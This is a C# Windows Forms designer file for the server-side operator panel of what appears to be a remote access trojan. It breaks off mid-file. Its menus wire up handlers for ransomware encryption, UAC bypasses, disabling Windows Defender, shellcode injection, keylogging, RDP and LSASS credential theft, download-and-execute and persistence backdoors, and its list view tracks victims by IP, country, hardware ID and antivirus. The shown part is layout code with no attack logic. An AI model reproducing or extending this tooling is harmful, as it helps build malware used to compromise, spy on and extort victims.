﻿namespace Server
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.contextMenuClient = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.reconToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sysinfoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.netstatToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.RemoteManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RemoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RemoteScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remotePowershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SystemControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ClientControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.StopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.RestartToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.UpdateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.UninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ShutDownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RebootToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.LogoutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.processManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.regeditToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.BypassUACAToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SilentCleanupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FodhelperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RunasToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.CompMgmtLauncherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.MalwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RansomwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.EncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DecryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DisableWDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DisableUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.shellcodeInjectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rdpThiefToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.credentialsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.dumpLsassToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.dumpWcmToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.logonPasswordsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.otherPasswordsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.persistenceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startUpToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.installToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.uninstallToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.schtaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.installToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.uninstallToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.userAddToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.winlogonHelperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hijackDefaultExtToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hijackScrnSaverToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.wMIBackdoorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RemoteControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SendFileToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.fromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SendFileToDiskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SendFileToMemoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.VisteWebsiteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.FileSearchToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteCameraToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.recordToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.programNotificationToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ping = new System.Windows.Forms.Timer(this.components);
            this.UpdateUI = new System.Windows.Forms.Timer(this.components);
            this.contextMenuLogs = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.cLEARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuThumbnail = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.sTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
            this.contextMenuTasks = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.sendFileFromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadAndExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sENDFILETOMEMORYToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.disableUACToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.disableWDToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.installSchtaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uPDATEToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.autoKeyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fakeBinderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.dELETETASKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
            this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.TimerTask = new System.Windows.Forms.Timer(this.components);
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.builderToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.blockToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.settingToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.splitContainer1 = new System.Windows.Forms.SplitContainer();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.listView1 = new System.Windows.Forms.ListView();
            this.lv_ip = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_country = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_group = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_hwid = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_user = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_camera = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_os = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_version = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_ins = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_admin = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_av = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_ping = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_act = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.listView3 = new System.Windows.Forms.ListView();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.listView4 = new System.Windows.Forms.ListView();
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.listView2 = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ConnectTimeout = new System.Windows.Forms.Timer(this.components);
            this.contextMenuClient.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.contextMenuLogs.SuspendLayout();
            this.contextMenuThumbnail.SuspendLayout();
            this.contextMenuTasks.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).BeginInit();
            this.menuStrip1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).BeginInit();
            this.splitContainer1.Panel1.SuspendLayout();
            this.splitContainer1.Panel2.SuspendLayout();
            this.splitContainer1.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.SuspendLayout();
            // 
            // contextMenuClient
            // 
            this.contextMenuClient.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.contextMenuClient.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.reconToolStripMenuItem,
            this.RemoteManagerToolStripMenuItem,
            this.SystemControlToolStripMenuItem,
            this.BypassUACAToolStripMenuItem,
            this.MalwareToolStripMenuItem,
            this.credentialsToolStripMenuItem,
            this.persistenceToolStripMenuItem,
            this.RemoteControlToolStripMenuItem});
            this.contextMenuClient.Name = "contextMenuStrip1";
            this.contextMenuClient.Size = new System.Drawing.Size(152, 180);
            // 
            // reconToolStripMenuItem
            // 
            this.reconToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sysinfoToolStripMenuItem,
            this.netstatToolStripMenuItem1});
            this.reconToolStripMenuItem.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.reconToolStripMenuItem.Name = "reconToolStripMenuItem";
            this.reconToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.reconToolStripMenuItem.Text = "Recon";
            // 
            // sysinfoToolStripMenuItem
            // 
            this.sysinfoToolStripMenuItem.Name = "sysinfoToolStripMenuItem";
            this.sysinfoToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
            this.sysinfoToolStripMenuItem.Text = "Sysinfo";
            this.sysinfoToolStripMenuItem.Click += new System.EventHandler(this.sysinfoToolStripMenuItem_Click);
            // 
            // netstatToolStripMenuItem1
            // 
            this.netstatToolStripMenuItem1.Name = "netstatToolStripMenuItem1";
            this.netstatToolStripMenuItem1.Size = new System.Drawing.Size(123, 22);
            this.netstatToolStripMenuItem1.Text = "Netstat";
            this.netstatToolStripMenuItem1.Click += new System.EventHandler(this.netstatToolStripMenuItem1_Click);
            // 
            // RemoteManagerToolStripMenuItem
            // 
            this.RemoteManagerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.RemoteShellToolStripMenuItem,
            this.RemoteScreenToolStripMenuItem,
            this.remotePowershellToolStripMenuItem});
            this.RemoteManagerToolStripMenuItem.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.RemoteManagerToolStripMenuItem.Name = "RemoteManagerToolStripMenuItem";
            this.RemoteManagerToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.RemoteManagerToolStripMenuItem.Text = "Interact";
            // 
            // RemoteShellToolStripMenuItem
            // 
            this.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem";
            this.RemoteShellToolStripMenuItem.Size = new System.Drawing.Size(193, 22);
            this.RemoteShellToolStripMenuItem.Text = "Remote Shell";
            this.RemoteShellToolStripMenuItem.Click += new System.EventHandler(this.RemoteShellToolStripMenuItem_Click);
            // 
            // RemoteScreenToolStripMenuItem
            // 
            this.RemoteScreenToolStripMenuItem.Name = "RemoteScreenToolStripMenuItem";
            this.RemoteScreenToolStripMenuItem.Size = new System.Drawing.Size(193, 22);
            this.RemoteScreenToolStripMenuItem.Text = "Remote Screen";
            this.RemoteScreenToolStripMenuItem.Click += new System.EventHandler(this.RemoteScreenToolStripMenuItem_Click);
            // 
            // remotePowershellToolStripMenuItem
            // 
            this.remotePowershellToolStripMenuItem.Name = "remotePowershellToolStripMenuItem";
            this.remotePowershellToolStripMenuItem.Size = new System.Drawing.Size(193, 22);
            this.remotePowershellToolStripMenuItem.Text = "Remote Powershell";
            this.remotePowershellToolStripMenuItem.Click += new System.EventHandler(this.remotePowershellToolStripMenuItem_Click);
            // 
            // SystemControlToolStripMenuItem
            // 
            this.SystemControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ClientControlToolStripMenuItem,
            this.SystemToolStripMenuItem,
            this.fileManagerToolStripMenuItem1,
            this.processManagerToolStripMenuItem,
            this.regeditToolStripMenuItem});
            this.SystemControlToolStripMenuItem.Name = "SystemControlToolStripMenuItem";
            this.SystemControlToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.SystemControlToolStripMenuItem.Text = "Management";
            // 
            // ClientControlToolStripMenuItem
            // 
            this.ClientControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.StopToolStripMenuItem1,
            this.RestartToolStripMenuItem1,
            this.UpdateToolStripMenuItem,
            this.UninstallToolStripMenuItem,
            this.ClientFolderToolStripMenuItem});
            this.ClientControlToolStripMenuItem.Name = "ClientControlToolStripMenuItem";
            this.ClientControlToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.ClientControlToolStripMenuItem.Text = "Client Control";
            // 
            // StopToolStripMenuItem1
            // 
            this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
            this.StopToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
            this.StopToolStripMenuItem1.Text = "Stop";
            this.StopToolStripMenuItem1.Click += new System.EventHandler(this.StopToolStripMenuItem1_Click);
            // 
            // RestartToolStripMenuItem1
            // 
            this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
            this.RestartToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
            this.RestartToolStripMenuItem1.Text = "Restart";
            this.RestartToolStripMenuItem1.Click += new System.EventHandler(this.RestartToolStripMenuItem1_Click);
            // 
            // UpdateToolStripMenuItem
            // 
            this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
            this.UpdateToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
            this.UpdateToolStripMenuItem.Text = "Update";
            this.UpdateToolStripMenuItem.Click += new System.EventHandler(this.UpdateToolStripMenuItem_Click);
            // 
            // UninstallToolStripMenuItem
            // 
            this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
            this.UninstallToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
            this.UninstallToolStripMenuItem.Text = "Uninstall";
            this.UninstallToolStripMenuItem.Click += new System.EventHandler(this.UninstallToolStripMenuItem_Click);
            // 
            // ClientFolderToolStripMenuItem
            // 
            this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
            this.ClientFolderToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
            this.ClientFolderToolStripMenuItem.Text = "Client Folder";
            this.ClientFolderToolStripMenuItem.Click += new System.EventHandler(this.ClientFolderToolStripMenuItem_Click);
            // 
            // SystemToolStripMenuItem
            // 
            this.SystemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ShutDownToolStripMenuItem,
            this.RebootToolStripMenuItem,
            this.LogoutToolStripMenuItem});
            this.SystemToolStripMenuItem.Name = "SystemToolStripMenuItem";
            this.SystemToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.SystemToolStripMenuItem.Text = "System";
            // 
            // ShutDownToolStripMenuItem
            // 
            this.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem";
            this.ShutDownToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.ShutDownToolStripMenuItem.Text = "Shut Down";
            this.ShutDownToolStripMenuItem.Click += new System.EventHandler(this.ShutDownToolStripMenuItem_Click);
            // 
            // RebootToolStripMenuItem
            // 
            this.RebootToolStripMenuItem.Name = "RebootToolStripMenuItem";
            this.RebootToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.RebootToolStripMenuItem.Text = "Reboot";
            this.RebootToolStripMenuItem.Click += new System.EventHandler(this.RebootToolStripMenuItem_Click);
            // 
            // LogoutToolStripMenuItem
            // 
            this.LogoutToolStripMenuItem.Name = "LogoutToolStripMenuItem";
            this.LogoutToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
            this.LogoutToolStripMenuItem.Text = "Logout";
            this.LogoutToolStripMenuItem.Click += new System.EventHandler(this.LogoutToolStripMenuItem_Click);
            // 
            // fileManagerToolStripMenuItem1
            // 
            this.fileManagerToolStripMenuItem1.Name = "fileManagerToolStripMenuItem1";
            this.fileManagerToolStripMenuItem1.Size = new System.Drawing.Size(179, 22);
            this.fileManagerToolStripMenuItem1.Text = "File Manager";
            this.fileManagerToolStripMenuItem1.Click += new System.EventHandler(this.fileManagerToolStripMenuItem1_Click);
            // 
            // processManagerToolStripMenuItem
            // 
            this.processManagerToolStripMenuItem.Name = "processManagerToolStripMenuItem";
            this.processManagerToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.processManagerToolStripMenuItem.Text = "Process Manager";
            this.processManagerToolStripMenuItem.Click += new System.EventHandler(this.processManagerToolStripMenuItem_Click);
            // 
            // regeditToolStripMenuItem
            // 
            this.regeditToolStripMenuItem.Name = "regeditToolStripMenuItem";
            this.regeditToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
            this.regeditToolStripMenuItem.Text = "Regedit";
            this.regeditToolStripMenuItem.Click += new System.EventHandler(this.regeditToolStripMenuItem_Click);
            // 
            // BypassUACAToolStripMenuItem
            // 
            this.BypassUACAToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.SilentCleanupToolStripMenuItem,
            this.FodhelperToolStripMenuItem,
            this.RunasToolStripMenuItem,
            this.CompMgmtLauncherToolStripMenuItem});
            this.BypassUACAToolStripMenuItem.Name = "BypassUACAToolStripMenuItem";
            this.BypassUACAToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.BypassUACAToolStripMenuItem.Text = "Bypass UAC";
            // 
            // SilentCleanupToolStripMenuItem
            // 
            this.SilentCleanupToolStripMenuItem.Name = "SilentCleanupToolStripMenuItem";
            this.SilentCleanupToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.SilentCleanupToolStripMenuItem.Text = "Silent Cleanup";
            this.SilentCleanupToolStripMenuItem.Click += new System.EventHandler(this.SilentCleanupToolStripMenuItem_Click);
            // 
            // FodhelperToolStripMenuItem
            // 
            this.FodhelperToolStripMenuItem.Name = "FodhelperToolStripMenuItem";
            this.FodhelperToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.FodhelperToolStripMenuItem.Text = "Fodhelper";
            this.FodhelperToolStripMenuItem.Click += new System.EventHandler(this.FodhelperToolStripMenuItem_Click);
            // 
            // RunasToolStripMenuItem
            // 
            this.RunasToolStripMenuItem.Name = "RunasToolStripMenuItem";
            this.RunasToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.RunasToolStripMenuItem.Text = "Runas";
            this.RunasToolStripMenuItem.Click += new System.EventHandler(this.RunasToolStripMenuItem_Click);
            // 
            // CompMgmtLauncherToolStripMenuItem
            // 
            this.CompMgmtLauncherToolStripMenuItem.Name = "CompMgmtLauncherToolStripMenuItem";
            this.CompMgmtLauncherToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.CompMgmtLauncherToolStripMenuItem.Text = "CompMgmtLauncher";
            this.CompMgmtLauncherToolStripMenuItem.Click += new System.EventHandler(this.CompMgmtLauncherToolStripMenuItem_Click);
            // 
            // MalwareToolStripMenuItem
            // 
            this.MalwareToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.RansomwareToolStripMenuItem,
            this.DisableWDToolStripMenuItem,
            this.DisableUACToolStripMenuItem,
            this.shellcodeInjectToolStripMenuItem,
            this.rdpThiefToolStripMenuItem,
            this.keyloggerToolStripMenuItem});
            this.MalwareToolStripMenuItem.Name = "MalwareToolStripMenuItem";
            this.MalwareToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.MalwareToolStripMenuItem.Text = "Malware";
            // 
            // RansomwareToolStripMenuItem
            // 
            this.RansomwareToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.EncryptToolStripMenuItem,
            this.DecryptToolStripMenuItem});
            this.RansomwareToolStripMenuItem.Name = "RansomwareToolStripMenuItem";
            this.RansomwareToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.RansomwareToolStripMenuItem.Text = "Ransomware";
            // 
            // EncryptToolStripMenuItem
            // 
            this.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem";
            this.EncryptToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
            this.EncryptToolStripMenuItem.Text = "Encrypt";
            this.EncryptToolStripMenuItem.Click += new System.EventHandler(this.EncryptToolStripMenuItem_Click);
            // 
            // DecryptToolStripMenuItem
            // 
            this.DecryptToolStripMenuItem.Name = "DecryptToolStripMenuItem";
            this.DecryptToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
            this.DecryptToolStripMenuItem.Text = "Decrypt";
            this.DecryptToolStripMenuItem.Click += new System.EventHandler(this.DecryptToolStripMenuItem_Click);
            // 
            // DisableWDToolStripMenuItem
            // 
            this.DisableWDToolStripMenuItem.Name = "DisableWDToolStripMenuItem";
            this.DisableWDToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.DisableWDToolStripMenuItem.Text = "Disable WD";
            this.DisableWDToolStripMenuItem.Click += new System.EventHandler(this.DisableWDToolStripMenuItem_Click);
            // 
            // DisableUACToolStripMenuItem
            // 
            this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
            this.DisableUACToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.DisableUACToolStripMenuItem.Text = "Disable UAC";
            this.DisableUACToolStripMenuItem.Click += new System.EventHandler(this.DisableUACToolStripMenuItem_Click);
            // 
            // shellcodeInjectToolStripMenuItem
            // 
            this.shellcodeInjectToolStripMenuItem.Name = "shellcodeInjectToolStripMenuItem";
            this.shellcodeInjectToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.shellcodeInjectToolStripMenuItem.Text = "Shellcode Inject";
            this.shellcodeInjectToolStripMenuItem.Click += new System.EventHandler(this.ShellcodeInjectToolStripMenuItem_Click);
            // 
            // rdpThiefToolStripMenuItem
            // 
            this.rdpThiefToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem2,
            this.stopToolStripMenuItem3});
            this.rdpThiefToolStripMenuItem.Name = "rdpThiefToolStripMenuItem";
            this.rdpThiefToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.rdpThiefToolStripMenuItem.Text = "RdpThief";
            // 
            // startToolStripMenuItem2
            // 
            this.startToolStripMenuItem2.Name = "startToolStripMenuItem2";
            this.startToolStripMenuItem2.Size = new System.Drawing.Size(109, 22);
            this.startToolStripMenuItem2.Text = "Start";
            this.startToolStripMenuItem2.Click += new System.EventHandler(this.startToolStripMenuItem2_Click);
            // 
            // stopToolStripMenuItem3
            // 
            this.stopToolStripMenuItem3.Name = "stopToolStripMenuItem3";
            this.stopToolStripMenuItem3.Size = new System.Drawing.Size(109, 22);
            this.stopToolStripMenuItem3.Text = "Stop";
            this.stopToolStripMenuItem3.Click += new System.EventHandler(this.stopToolStripMenuItem3_Click);
            // 
            // keyloggerToolStripMenuItem
            // 
            this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.keyloggerToolStripMenuItem.Text = "Keylogger";
            this.keyloggerToolStripMenuItem.Click += new System.EventHandler(this.keyloggerToolStripMenuItem_Click);
            // 
            // credentialsToolStripMenuItem
            // 
            this.credentialsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.dumpLsassToolStripMenuItem,
            this.dumpWcmToolStripMenuItem,
            this.logonPasswordsToolStripMenuItem1,
            this.otherPasswordsToolStripMenuItem});
            this.credentialsToolStripMenuItem.Name = "credentialsToolStripMenuItem";
            this.credentialsToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.credentialsToolStripMenuItem.Text = "Credentials";
            // 
            // dumpLsassToolStripMenuItem
            // 
            this.dumpLsassToolStripMenuItem.Name = "dumpLsassToolStripMenuItem";
            this.dumpLsassToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.dumpLsassToolStripMenuItem.Text = "Dump Lsass";
            this.dumpLsassToolStripMenuItem.Click += new System.EventHandler(this.dumpLsassToolStripMenuItem_Click);
            // 
            // dumpWcmToolStripMenuItem
            // 
            this.dumpWcmToolStripMenuItem.Name = "dumpWcmToolStripMenuItem";
            this.dumpWcmToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.dumpWcmToolStripMenuItem.Text = "Dump Wcm";
            this.dumpWcmToolStripMenuItem.Click += new System.EventHandler(this.dumpWcmToolStripMenuItem_Click);
            // 
            // logonPasswordsToolStripMenuItem1
            // 
            this.logonPasswordsToolStripMenuItem1.Name = "logonPasswordsToolStripMenuItem1";
            this.logonPasswordsToolStripMenuItem1.Size = new System.Drawing.Size(172, 22);
            this.logonPasswordsToolStripMenuItem1.Text = "LogonPasswords";
            this.logonPasswordsToolStripMenuItem1.Click += new System.EventHandler(this.logonPasswordsToolStripMenuItem1_Click);
            // 
            // otherPasswordsToolStripMenuItem
            // 
            this.otherPasswordsToolStripMenuItem.Name = "otherPasswordsToolStripMenuItem";
            this.otherPasswordsToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.otherPasswordsToolStripMenuItem.Text = "OtherPasswords";
            this.otherPasswordsToolStripMenuItem.Click += new System.EventHandler(this.otherPasswordsToolStripMenuItem_Click);
            // 
            // persistenceToolStripMenuItem
            // 
            this.persistenceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startUpToolStripMenuItem,
            this.schtaskToolStripMenuItem,
            this.userAddToolStripMenuItem,
            this.winlogonHelperToolStripMenuItem,
            this.hijackDefaultExtToolStripMenuItem,
            this.hijackScrnSaverToolStripMenuItem,
            this.wMIBackdoorToolStripMenuItem});
            this.persistenceToolStripMenuItem.Name = "persistenceToolStripMenuItem";
            this.persistenceToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.persistenceToolStripMenuItem.Text = "Persistence";
            // 
            // startUpToolStripMenuItem
            // 
